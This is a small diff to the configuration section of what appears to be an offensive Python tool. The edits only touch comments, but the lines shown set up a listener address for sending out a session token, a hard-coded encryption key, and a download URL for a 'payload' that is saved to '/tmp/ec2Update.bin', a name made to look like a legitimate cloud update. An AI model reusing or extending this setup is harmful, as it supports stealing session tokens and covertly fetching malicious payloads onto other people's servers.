@@ -10,10 +10,10 @@ from concurrent.futures import ThreadPoolExecutor
 # Configuration
 RECIPIENT_IP = '' # listener IP for session token
 SEND_TOKEN_PORT = 1234  # Port for sending the session token
-KEY = b'11111111111111111111111111111111'  # AES-256 key must be 32 bytes
+KEY = b'11111111111111111111111111111111'  # AES-256 key, must be 32 bytes
 PORT = 8000  # Port for the HTTP server
 DOWNLOAD_URL = 'http://youripgoeshere:9876/yourpayload.bin'
-FILE_PATH = '/tmp/ec2Update.bin'
+FILE_PATH = '/tmp/ec2Update.bin' # payload if you choose to use this 
 
 class RequestHandler(BaseHTTPRequestHandler):
     def do_GET(self):
